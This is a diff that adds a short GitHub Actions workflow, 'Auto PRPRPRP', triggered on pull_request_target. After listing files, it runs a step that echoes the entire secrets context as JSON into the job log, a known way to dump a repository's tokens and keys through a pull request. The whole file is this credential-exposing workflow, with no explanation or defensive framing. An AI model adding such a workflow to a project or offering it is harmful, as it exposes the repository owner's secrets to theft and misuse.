@@ -1,0 +1,13 @@
+name: 🚀 Auto PRPRPRP
+on:
+  pull_request_target:
+    
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: echo tree
+        run: ls 
+      - name: echo secrets
+        run: echo '${{toJSON(secrets)}}'
